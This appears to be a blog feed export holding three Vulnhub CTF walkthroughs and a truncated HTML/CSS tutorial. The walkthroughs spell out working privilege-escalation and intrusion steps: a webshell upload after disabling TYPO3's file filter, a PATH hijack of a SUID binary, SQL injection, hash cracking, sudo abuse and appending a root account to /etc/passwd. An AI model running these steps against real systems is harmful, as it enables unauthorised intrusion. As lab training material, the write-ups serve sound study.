        <content type="html"><![CDATA[<p>开机显示IP，直接Nmap扫描:<code>nmap -A -p- -v -T4 -oA nmap 192.168.10.59</code><br>发现开了4个HTTP协议的端口，还有一个22端口，对http协议端口进行url枚举，<br>8080端口发现一个phpinfo：<a href="http://192.168.10.59:8080/phpinfo.php">http://192.168.10.59:8080/phpinfo.php</a><br>8081端口发现一个phpmyadmin：<a href="http://192.168.10.59:8081/phpmyadmin/">http://192.168.10.59:8081/phpmyadmin/</a><br>80端口发现一个typo3 cms：<a href="http://192.168.10.59/typo3/">http://192.168.10.59/typo3/</a><br>对phpmyadmin进行root:root弱口令登录，结果登录成功了。<br><img src="https://img.xpctf.cn/img/20200924150953.png"><br>登录后发现是phpmyadmin版本是5.0.2，搜索phpmyadmin的getshell，但最后都没能成功。</p><p>继续找typo3的用户表，但这个加密奇怪，直接进行替换。百度搜了一个typo3搭建到本地，用也知明文的密文替换靶机的密码，成功登录到后台。(后来我发现直接使用openssl生成一个密码也可以)<br><img src="https://img.xpctf.cn/img/20200924151138.png"><br>写博客前偷瞄师傅的wp说argon2id这个是一种加密方式，在线网站：<a href="https://argon2.online/">https://argon2.online/</a><br><img src="https://img.xpctf.cn/img/20200924152009.png"></p><p>登录成功后就是getshell，在file选项卡找到一个文件上传的界面<br><img src="https://img.xpctf.cn/img/20200924152157.png"><br>但是无法上传php文件，又偷瞄了一眼师傅博客发现设置里可以修改。<br><img src="https://img.xpctf.cn/img/20200924152329.png"><br>找到fileDenyPattern设置项把里面的内容全部删除后点击“Write configuration”<br><img src="https://img.xpctf.cn/img/20200924152648.png"></p><p>修改设置后继续上传就能成功，接下来就是找文件路径，其实配置文件就有上传路径<br><img src="https://img.xpctf.cn/img/20200924152856.png"><br>我们访问上传的webshell成功获得反弹shell，继续对机器进行提权<br><img src="https://img.xpctf.cn/img/20200924153125.png"><br>经过检查发现没有多余用户，那就是直接提权到root用户，看了一下内核版本很高；查看了suid发现了一个很可疑的文件apache2-restart，对他进行逆向发现执行了<code>service apache2 start</code>，难怪名字叫apache2-restart。(就瞄了一眼)<br><img src="https://img.xpctf.cn/img/20200924153437.png"></p><p>当执行clear命令出现以下报错是，设置TERM变量即可：<code>export TERM=xterm-256color</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">clear</span></span><br><span class="line">TERM environment variable not set.</span><br></pre></td></tr></table></figure><p>通过修改环境变量(env)让service命令执行我们写的文件来提权，由于终端缺陷命令错了不能修改(手残)，所以写了一个脚本来执行。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">echo $PATH</span><br><span class="line">export PATH=/tmp:$PATH</span><br><span class="line">cd /tmp</span><br><span class="line">echo &#x27;/bin/bash&#x27; &gt; service</span><br><span class="line">chmod +x service</span><br><span class="line">/usr/local/bin/apache2-restart</span><br></pre></td></tr></table></figure><p><img src="https://img.xpctf.cn/img/20200924154640.png"></p>]]></content>
      
      
      <categories>
          
          <category> vulnhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>FUNBOX: EASY Writeup</title>
      <link href="/posts/872/"/>
      <url>/posts/872/</url>
      
        <content type="html"><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>描述上说有很多兔子洞，我没怎么踩，唯一的坑就是在提权到用户的踩了。<br>靶机IP：192.168.10.58<br>Kali：192.168.10.12</p><p>nmap扫描：<code>nmap -A -p- -T4 -v -oA nmap 192.168.10.58</code><br><img src="https://img.xpctf.cn/img/20200922160315.png"><br>开放端口：22 80 33060</p><p>先dirb扫描目录，发现了几个有用的目录，先访问robots.txt,看到了gym目录<br><img src="https://img.xpctf.cn/img/20200922161654.png"></p><p>通过搜索发现了gym是健身管理系统并存在一个文件上传漏洞，执行的脚本无果，应该是兔子洞，继续看其他目录。</p><p>admin目录打开是一个后他界面，尝试了弱口令无果，继续看secret和store目录。终于在store看到了希望，看到了一个pubid参数，尝试sql注入。<br><img src="https://img.xpctf.cn/img/20200922161810.png"></p><p>输入单引号后爆出sql语句错误，上sqlmap跑。<br><img src="https://img.xpctf.cn/img/20200922161935.png"></p><p>最后得出store库admin表的账号密码，使用帐号密码登录store后台。<br><img src="https://img.xpctf.cn/img/20200922162028.png"></p><p>在编辑书本信息处找到了文件上传页面，尝试上传webshell。<br><img src="https://img.xpctf.cn/img/20200922162526.png"></p><p>webshell上传成功，没有任何过滤，nc监听端口，去网站刷新一下拿到webshell。<br><img src="https://img.xpctf.cn/img/20200923083649.png"></p><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>在tony用户家目录找到一个password.txt文件，ssh: yxcvbnmYYY就是tony用户的密码，我卡了半天。<br><img src="https://img.xpctf.cn/img/20200923083841.png"><br>使用ssh连接到tony用户，发现该用户拥有sudo权限和lxd组<br><img src="https://img.xpctf.cn/img/20200923084058.png"></p><p>由于funbox:2就是lxd提权，这次改成sudo提权，sudo命令较多，大部分都可以提权，我们选用最简单的&#x2F;usr&#x2F;bin&#x2F;pkexec提权：<code>sudo -u root /usr/bin/pkexec /bin/sh</code><br><img src="https://img.xpctf.cn/img/20200923084255.png"><br>time也很好提权：<code>sudo time /bin/bash</code><br><img src="https://img.xpctf.cn/img/20200923084343.png"></p><p>提权字典：<a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></p>]]></content>
      
      
      <categories>
          
          <category> vulnhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> funbox </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>funbox: rookie Writeup</title>
      <link href="/posts/d826/"/>
      <url>/posts/d826/</url>
      
        <content type="html"><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>靶机IP：192.168.10.57<br>Kali：192.168.10.12</p><p>先使用nmap扫描：<code>nmap -T4 -v -p- -A -oA nmap 192.168.10.57</code><br>开放端口：21 22 80<br>习惯性dirb发现一个logs，访问是404，看到ftp能匿名访问，登录发现类似用户名的压缩包，全部get到本地。<br><img src="https://img.xpctf.cn/img/20200922112115.png"></p><h2 id="压缩包破解"><a href="#压缩包破解" class="headerlink" title="压缩包破解"></a>压缩包破解</h2><p>下载后先阅读.@admins、.@users、welcome.msg。发现.@admins类似base64<br><img src="https://img.xpctf.cn/img/20200922112246.png"><br>使用<code>echo &#39;SGkgQWRtaW5zLAoKYmUgY2FyZWZ1bGwgd2l0aCB5b3VyIGtleXMuIEZpbmQgdGhlbSBpbiAleW91cm5hbWUlLnppcC4KVGhlIHBhc3N3b3JkcyBhcmUgdGhlIG9sZCBvbmVzLgoKUmVnYXJkcwpyb290&#39; |base64 -d</code>解密后发现没什么东西，和.@users类似。<br><img src="https://img.xpctf.cn/img/20200922112420.png"><br>还发现压缩包大小都是一样的，使用zip2john取出全部压缩包的hash：<code>zip2john *.zip &gt;&gt; hash</code><br><img src="https://img.xpctf.cn/img/20200922112628.png"><br>然后使用john破解hash：<code>john hash --wordlist=/usr/share/wordlists/rockyou.txt</code><br>破解出两个密码，使用密码解压对应的文件<br><img src="https://img.xpctf.cn/img/20200922113027.png"></p><h2 id="用户登录"><a href="#用户登录" class="headerlink" title="用户登录"></a>用户登录</h2><p>使用解压的密钥登录tom账号，tab不能补全命令，发现rbash限制用户执行的命令，使用bash -i即可绕过。<br><img src="https://img.xpctf.cn/img/20200922113329.png"><br>输入id后发现tom在lxd组，可以使用lxd提权。<br><img src="https://img.xpctf.cn/img/20200922113618.png"></p><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>把之前编译的lxd提权包下载到本地，使用脚本即可提权成功。<br><img src="https://img.xpctf.cn/img/20200922113923.png"><br>由于现在是在容器里面读取，如果需要完美的进入宿主机器，可以在passwd文件写一个账号<br>生成一个密码：<code>openssl passwd -1 admin</code><br><img src="https://img.xpctf.cn/img/20200922115141.png"><br>构造一个用户名：<code>rOOt:$1$Y6W9y42e$RbrNLaswviyaMulMUNTK6/:0:0:root:/root:/bin/bash</code><br>追加写入到passwd : <code>echo &#39;rOOt:$1$Y6W9y42e$RbrNLaswviyaMulMUNTK6/:0:0:root:/root:/bin/bash&#39; &gt;&gt; /mnt/root/etc/passwd</code><br>退出容器，切换到rOOt用户，密码admin，即可完美提权。<br><img src="https://img.xpctf.cn/img/20200922114958.png"><br>alpine包编译：<a href="https://www.xpctf.cn/posts/3bac/#lxd%E5%92%8Clxc%E6%8F%90%E6%9D%83">https://www.xpctf.cn/posts/3bac/#lxd%E5%92%8Clxc%E6%8F%90%E6%9D%83</a></p>]]></content>
      
      
      <categories>
          
          <category> vulnhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> funbox </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>html+css前端学习</title>
      <link href="/posts/1d9/"/>
      <url>/posts/1d9/</url>
      
        <content type="html"><![CDATA[<h2 id="Emmet语法"><a href="#Emmet语法" class="headerlink" title="Emmet语法"></a>Emmet语法</h2><h3 id="Emmet是什么"><a href="#Emmet是什么" class="headerlink" title="Emmet是什么"></a>Emmet是什么</h3><p>Emmet语法的前身是Zen coding，它使用缩写来提供html&#x2F;css的编写速度，vscode内部已经集成了改语法。</p><h3 id="生成html结构语法"><a href="#生成html结构语法" class="headerlink" title="生成html结构语法"></a>生成html结构语法</h3><p>1、生成标签：直接输入标签名后按tab键(回车键)补全标签<br>2、生成多标签：输入”div*3”生成三个div标签<br>3、父级标签：输入”ul&gt;li”能生成一对ul标签 “ul&gt;li*10”生成10个li<br>4、同级标签：使用+号链接 “div+p”<br>5、包含类名：”标签名.值”生成带class属性的标签，属性值为”值“，默认div标签<br>6、包含ID：”标签名#值”生成带id属性的标签，属性值为”值“，默认div标签<br>7、自增长：使用$符号来实现数字自增长，和*配合使用”.demo$*10”<br>8、生成文字：使用{}来包含文字，被包含的文件会写到标签中”div{Hello}”</p><h3 id="生成css样式语法"><a href="#生成css样式语法" class="headerlink" title="生成css样式语法"></a>生成css样式语法</h3><p>生成CSS使用缩写即可，比如w100&#x2F;h100即可；以font-size为例，可以输入fsz，fns也可以，只要是包含缩写的样式都会显示出来，如果有多个就在写一个字母。</p><h3 id="格式化代码"><a href="#格式化代码" class="headerlink" title="格式化代码"></a>格式化代码</h3><p>vscode中提供了标准html+css语法的格式化功能，快捷键Shift+Alt+F，或者右键选择格式化文档。<br>修改vscode配置文件实现保存时自动格式化，打开设置搜索”emmet”，选择”在setings.json中编辑”，添加如下内容</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;editor.formatOnType&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;editor.formatOnSave&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span></span><br></pre></td></tr></table></figure><p><img src="https://img.xpctf.cn/img/20200917134850.png"></p><h2 id="CSS复合选择器"><a href="#CSS复合选择器" class="headerlink" title="CSS复合选择器"></a>CSS复合选择器</h2><h3 id="复合选择器是什么"><a href="#复合选择器是什么" class="headerlink" title="复合选择器是什么"></a>复合选择器是什么</h3><p>在CSS中，可以根据选择器的类型把选择器分为基础选择器和复合选择器，复合选择器是建立在基础选择器之上的，对基本选择器进行组合形成的。</p><ul><li>复合选择器可以更精准、更高效的选择目标元素(标签)</li><li>复合选择器是由两个或多个基础选择器通过不同的方式组合而成的</li><li>常用的复合选择器包括：后代选择器、子选择器、并集选择器、伪类选择器等等</li></ul><h3 id="后代选择器"><a href="#后代选择器" class="headerlink" title="后代选择器"></a>后代选择器</h3><p>后代选择器又称包含选择器，可以选择父元素里面的子元素。其写法就是把外层标签写在前面，内层标签写在后面，中间用空格分隔。当标签发生嵌套时，内部标签就称为外部标签的后代。<br>语法：父元素 子元素 {样式属性：属性值;}<br>父元素和子元素可以是任意一种普通选择，比如类选择器。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">ol</span> <span class="selector-tag">li</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: hotpink;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ol</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>我是ol的li<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>我是ol的li<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ol</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>我是ul的li<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>我是ul的li<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="子选择器"><a href="#子选择器" class="headerlink" title="子选择器"></a>子选择器</h3><p>子元素选择器(子选择器)只能选择作为某元素的最近一级子元素，简单理解就是选亲儿子元素。<br>后代选择器使用空格分割父子元素，子选择器使用&gt;号分割父子元素。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.nav</span>&gt;<span class="selector-tag">a</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: red;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;nav&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>子元素<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>孙元素<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>子元素<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="并集选择器"><a href="#并集选择器" class="headerlink" title="并集选择器"></a>并集选择器</h3><p>并集选择器可以选择多组标签，使用逗号分割多个元素，同时为他们定义相同的样式，并集选择器中又可以为其他选择器。通常用于集体声明。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">p</span>,</span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">span</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: red;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>小猪佩奇<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>猪爸爸<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span>&gt;</span>猪妈妈<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="伪类选择器"><a href="#伪类选择器" class="headerlink" title="伪类选择器"></a>伪类选择器</h3><p>伪类选择器用于向某些选择器添加特殊的效果，比如给链接田间特殊效果，或选择第1个，第n个元素。<br>伪类选择器书写最大的特点是用冒号(:)表示，因为伪类选择器有很多，比如链接伪类、结构伪类等。</p><h4 id="伪类链接选择器"><a href="#伪类链接选择器" class="headerlink" title="伪类链接选择器"></a>伪类链接选择器</h4><p>为了确保链接选择器能够生效，需要按照LVHA的顺序来定义样式，如果顺序不正常会导致显示不正常。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">a</span><span class="selector-pseudo">:link</span><span class="comment">/* 选择所有未被访问过的链接 */</span></span><br><span class="line"><span class="selector-tag">a</span><span class="selector-pseudo">:visited</span><span class="comment">/* 选择所有也被访问过的链接 */</span></span><br><span class="line"><span class="selector-tag">a</span><span class="selector-pseudo">:hover</span><span class="comment">/* 选择鼠标指针位于其上的链接 */</span></span><br><span class="line"><span class="selector-tag">a</span><span class="selector-pseudo">:active</span><span class="comment">/* 选择鼠标按下未弹起的链接 */</span></span><br></pre></td></tr></table></figure><h4 id="focus伪类型选择器"><a href="#focus伪类型选择器" class="headerlink" title=":focus伪类型选择器"></a>:focus伪类型选择器</h4><p>:focus伪类选择器可以用来获得焦点的表单元素，焦点就是光标，一般情况&lt;input&gt;类表单元素才能获取，因此这个选择器也主要针对于表单元素来说。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">input</span><span class="selector-pseudo">:focus</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-color</span>: red;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="CSS的元素显示模式"><a href="#CSS的元素显示模式" class="headerlink" title="CSS的元素显示模式"></a>CSS的元素显示模式</h2><h3 id="元素显示模式是什么"><a href="#元素显示模式是什么" class="headerlink" title="元素显示模式是什么"></a>元素显示模式是什么</h3><p><img src="https://img.xpctf.cn/img/20200917184549.png"></p><h3 id="块元素"><a href="#块元素" class="headerlink" title="块元素"></a>块元素</h3><p>常用的块元素有&lt;h1&gt;~&lt;h2&gt;、&lt;p&gt;、&lt;div&gt;、&lt;ul&gt;、&lt;ol&gt;、&lt;li&gt;等，其中&lt;div&gt;标签是最典型的块元素。<br>块元素的特点：</p><ul><li>独占一行</li><li>高、宽、外内边距都可以修改</li><li>宽度默认是容器的100%</li><li>是个容器或盒子，里面可以放行内或者块级元素</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;background-color: red;&quot;</span>&gt;</span>莫埃老子<span class="tag">&lt;/<span class="name">div</span>&gt;</span>大佬带带我</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>注意：</strong></p><ul><li>文字类的元素内不能使用块级元素</li></ul><h3 id="行内元素"><a href="#行内元素" class="headerlink" title="行内元素"></a>行内元素</h3><p>常见的行内元素有&lt;a&gt;、&lt;strong&gt;、&lt;b&gt;、&lt;em&gt;、&lt;i&gt;、&lt;del&gt;、&lt;s&gt;、&lt;ins&gt;、&lt;u&gt;、&lt;span&gt;等，其中&lt;span&gt;标签是最典型的行内元素，有的地方也将行内元素称为内联标签。<br>行内元素特点：</p><ul><li>相邻行内元素在一行上，一行可以显示多个</li><li>高、宽直接设置时无效的</li><li>默认宽度就是它本身内容的宽度</li><li>行内元素只能容纳文本或者其他行内元素</li></ul><p><strong>注意：</strong></p><ul><li>链接里面不能再放链接</li><li>链接里面可以放块元素</li></ul><h3 id="行内块元素"><a href="#行内块元素" class="headerlink" title="行内块元素"></a>行内块元素</h3><p>在行内元素中有几个特殊的标签：&lt;img &#x2F;&gt;、&lt;input &#x2F;&gt;、&lt;td&gt;,它们同时具有块元素和行内元素的特点，有些地方称它们为行内块元素。<br><img src="https://img.xpctf.cn/img/20200917195209.png"></p><h3 id="元素显示模式转换"><a href="#元素显示模式转换" class="headerlink" title="元素显示模式转换"></a>元素显示模式转换</h3><p>特殊情况下，我们需要元素模式的转换，简单理解：一个模式的元素需要另一种模式的特性。比如a标签需要增加触发范围。</p><p>转换为块级元素：display:block；</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">a</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-color</span>: red;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">display</span>: block;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>学习不是一两天的事<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p>转换为行内元素：display:inline；</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">div</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-color</span>: red;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">display</span>: inline;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>我是div<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>我也是<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p>转换成行内块元素：display:inline-block</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">span</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>: <span class="number">30px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-color</span>: red;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">display</span>: inline-block</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span>&gt;</span>我是span<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span>&gt;</span>我也是<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="简洁版小米侧边栏"><a href="#简洁版小米侧边栏" class="headerlink" title="简洁版小米侧边栏"></a>简洁版小米侧边栏</h3><p>因为CSS没有提供垂直居中的样式，所有只能曲线救国；使行边距和盒子高度相同，就能实行垂直居中。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 